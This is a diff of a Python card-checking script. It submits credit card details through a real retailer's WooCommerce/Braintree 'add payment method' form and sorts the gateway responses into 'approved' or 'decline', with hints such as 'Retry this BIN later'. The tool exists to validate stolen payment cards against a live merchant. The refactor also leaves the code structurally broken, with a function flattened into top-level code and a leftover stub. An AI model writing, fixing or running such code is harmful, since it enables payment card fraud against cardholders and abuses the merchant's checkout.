@@ -233,20 +233,16 @@ except Exception as e:
 
 
 	
-	
+				
+headers = {
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded',
+    'pragma': 'no-cache',
+    'user-agent': user,
+}
 
-
-
-
-def add_payment_method():
-	headers = {
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'cache-control': 'no-cache',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'pragma': 'no-cache',
-	    'user-agent': user,
-	}
-	data = {
+data = {
     'payment_method': 'braintree_credit_card',
     'wc-braintree-credit-card-card-type': 'visa',
     'wc-braintree-credit-card-3d-secure-enabled': '',
@@ -265,28 +261,30 @@ def add_payment_method():
     'woocommerce-add-payment-method-nonce': add_nonce,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1'
-	}
+}
+
     
-    response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
-    text = response.text
+response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+text = response.text
     
-    pattern = r'Status code (.*?)\s*</li>'
-    match = re.search(pattern, text)
+pattern = r'Status code (.*?)\s*</li>'
+match = re.search(pattern, text)
     
-    if match:
-        result = match.group(1)
-        if 'risk_threshold' in text:
-            result = "RISK: Retry this BIN later."
+if match:
+    result = match.group(1)
+    if 'risk_threshold' in text:
+        result = "RISK: Retry this BIN later."
+else:
+    if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+        result = "1000: Approved"
     else:
-        if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
-            result = "1000: Approved"
-        else:
-            result = "Error"
+        result = "Error"
     
-    if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
-        return 'Approved'
-    else:
-        return result
+if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
+    print("approved")
+else:
+    print("decline")
 
 def sq(card):
     return 'Your card was declined.'
+
